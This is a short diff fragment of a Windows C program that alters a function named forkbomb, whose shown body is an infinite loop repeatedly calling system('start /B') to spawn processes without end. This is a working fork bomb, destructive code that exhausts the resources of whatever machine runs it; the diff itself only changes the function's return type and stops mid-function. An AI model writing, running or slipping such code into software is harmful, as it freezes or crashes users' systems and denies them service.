@@ -3,7 +3,8 @@
 #include <stdio.h>
 #include <windows.h>
 
-void forkbomb() {
+const char* forkbomb() {
+    
         while (1)
         {
             system("start /B");
